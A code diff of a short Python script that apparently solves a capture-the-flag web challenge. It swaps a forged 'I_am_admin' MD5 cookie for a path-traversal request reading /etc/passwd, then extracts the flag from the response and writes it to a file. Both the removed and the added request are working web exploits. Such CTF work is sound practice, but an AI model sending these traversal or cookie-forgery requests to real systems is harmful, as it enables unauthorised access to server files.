@@ -1,7 +1,6 @@
 import requests
-import hashlib
-import json
 import sys
+import json
 import re
 
 
@@ -11,20 +10,17 @@ def get_flag(host_name):
     headers = {
         'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64…) Gecko/20100101 Firefox/67.0',
     }
-
     session = requests.Session()
-    response = session.get(
-        'http://{host}/'.format(host=host_name),
-        data=json.dumps(headers),
-        cookies={'I_am_admin': hashlib.md5('true'.encode('utf-8')).hexdigest()}
-    )
+    session.get('http://{host}/'.format(host=host_name), data=json.dumps(headers))
+    response = session.post('http://{host}/index.php?page=../../../../../../../etc/passwd'.format(host=host_name))
 
     if response.status_code == 200:
-        flag = re.findall(pattern="<script>alert(.*); </script>", string=response.content.decode('utf-8'))
+        flag = re.findall(pattern="<script>alert(.*);</script>", string=response.content.decode('utf-8'))
         flag = flag.pop().split(':')[-1].rstrip("')").strip()
 
         with open('../flag', 'w') as f:
             f.write(flag+'\n')
+
     return flag
 
 
